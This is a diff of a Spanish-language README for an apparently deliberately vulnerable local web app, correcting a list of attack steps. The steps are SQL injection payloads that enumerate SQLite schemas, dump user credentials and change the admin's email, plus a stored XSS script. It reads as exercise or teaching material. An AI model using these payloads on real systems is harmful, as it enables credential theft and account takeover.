@@ -21,18 +21,18 @@ Run: py app.py
    - Ahora, teniendo el nombre de la tabla, queremos descubrir los nombres de los campos (users, posts y comments)
    - ' UNION ALL SELECT 20, sql, '-' FROM sqlite_schema where name = 'users' --
    - ' UNION ALL SELECT 20, sql, '-' FROM sqlite_schema where name = 'posts' --
-   - ' UNION ALL SELECT 20, sql, '-' FROM sqlite_schema where name = 'commnets' --
+   - ' UNION ALL SELECT 20, sql, '-' FROM sqlite_schema where name = 'comments' --
 
    - Con toda la informacion previa, podemos ver la información de las tablas
-   - ' UNION ALL SELECT id, username || ' ' || email || ' ' || role, password FROM 'users' --
+   - ' UNION ALL SELECT id, id || ' ' || username || ' ' || email || ' ' || role, password FROM 'users' --
    - ' UNION ALL SELECT id, title, content FROM 'posts' --
    - ' UNION ALL SELECT id, content, post_id FROM 'comments' --
 
    - En el mismo campo, intentamos buscar la forma de cambiar el mail, pero no nos permite, ya que se ejecuta solo una consulta a la vez
-   - s' ); UPDATE users SET email='my_email' WHERE username='admin'; --
+   - s' ; UPDATE users SET email='my_email' WHERE username='admin'; --
 
    - Buscamos otros campos donde poder injectar sql. Encontramos que los posts tienen un campo texto, que permite esta injeccion
-   - s' ); UPDATE users SET email='`<un_mail>`' WHERE username='admin'; --
+   - s' ; UPDATE users SET email='`<un_mail>`' WHERE username='admin'; --
 
 3. ' UNION ALL SELECT 10 as id, sql AS content, '-' as title from sqlite_schema where name = 'users' --
 4. Logeado como admin, crear un post con contenido malicioso. Ejemplo de contenido: <script>alert('alerta xss')</script>
